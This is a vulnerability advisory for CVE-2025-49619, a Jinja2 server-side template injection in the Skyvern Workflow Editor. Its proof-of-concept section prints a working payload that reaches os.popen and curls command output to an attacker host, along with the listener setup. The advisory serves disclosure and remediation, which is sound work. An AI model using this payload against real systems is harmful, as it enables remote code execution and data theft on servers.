## CVE ASSIGNED: CVE-2025-49619
## CVE PUBLISHED STATE:  PUBLISHED
## CVE LINK: https://www.cve.org/CVERecord?id=CVE-2025-49619

## Description:
The Workflow Editor in Skyvern version 0.1.85 (up to commit db856cd) contains a Server-Side Template Injection (SSTI) vulnerability in the Navigation v2 Block's Prompt field. The application uses Jinja2 templating engine to render user-supplied template variables without proper sanitization or sandboxing. This allows authenticated attackers to inject malicious Jinja2 payloads that execute arbitrary system commands on the server, leading to complete system compromise through blind Remote Code Execution (RCE).

## Impact:
- Remote Code Execution (RCE) via Server-Side Template Injection
- Unauthorized access to sensitive data and file systems  
- Potential lateral movement in multi-tenant environments

## Attack Scenario:
1. Attacker gains access to Skyvern Workflow Editor (authenticated user)
2. Creates or modifies a workflow containing Navigation v2 Block
3. Injects malicious Jinja2 SSTI payload in the Prompt field
4. Executes the workflow to trigger template rendering
5. Achieves blind RCE through Jinja2 template execution


## Technical Details:
- **Vulnerability Type:** Server-Side Template Injection (SSTI)
- **CWE Classification:** CWE-94 (Improper Control of Generation of Code - Code Injection)
- **Attack Type:** Remote (Authenticated)  
- **Affected Version:** 0.1.85 (up to commit db856cd)
- **Affected Component:** Workflow Editor - Navigation v2 Block Prompt field
- **Impact:** Remote Code Execution
- **Template Engine:** Jinja2
- **Execution Context:** Blind RCE

## Affected Products:
- Skyvern Local: https://github.com/Skyvern-AI/skyvern
- Skyvern Cloud: https://app.skyvern.com/
- All installations running version 0.1.85 and prior (up to commit db856cd)
- Both local and cloud-hosted deployments

## Vendor Information:
Skyvern-AI  
https://github.com/Skyvern-AI/skyvern

## Proof of Concept:

### Exploitation Steps:
1. Access Skyvern Workflow Editor interface
2. Create new workflow or edit existing workflow
3. Add Navigation v2 Block to workflow
4. Insert SSTI payload in Prompt field
5. Execute workflow to trigger RCE

### SSTI Payload Example:
```jinja2
{% for x in ().__class__.__base__.__subclasses__() %}   
	{% if 'warning' in x.__name__ %}     
		{{ x()._module.__builtins__['__import__']('os').popen("curl http://attacker-ip:11111/$(id)").read() }}   
	{% endif %} 
{% endfor %}
```

### Attack Command Sequence:
```bash
# Start HTTP listener on attacker machine
python3 -m http.server 11111

# Payload executes on server during workflow execution
# Server makes HTTP request to attacker with command output
GET /uid=1000(skyvern)%20gid=1000(skyvern)%20groups=1000(skyvern) HTTP/1.1
```


## Root Cause Analysis:
The vulnerability stems from insufficient input validation and lack of sandboxing in Jinja2 template rendering. The application processes user-controlled template variables in Navigation v2 Block prompts without:
- Input sanitization or escaping
- Template sandboxing restrictions  
- Execution context limitations
- Dangerous function filtering

## References:
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- OWASP Code Injection: https://owasp.org/www-community/attacks/Code_Injection
- Jinja2 Template Security: https://jinja.palletsprojects.com/en/3.1.x/sandbox/
- Server-Side Template Injection: https://portswigger.net/web-security/server-side-template-injection

## Severity: Critical

## Fix Recommendations:
- **Immediate Actions:**
  - Implement Jinja2 SandboxedEnvironment for template rendering
  - Add comprehensive input validation and sanitization for all template variables
  - Whitelist allowed template functions and disable dangerous builtins
  - Implement template execution timeouts and resource limits

## Discoverer:
Cristian Branet
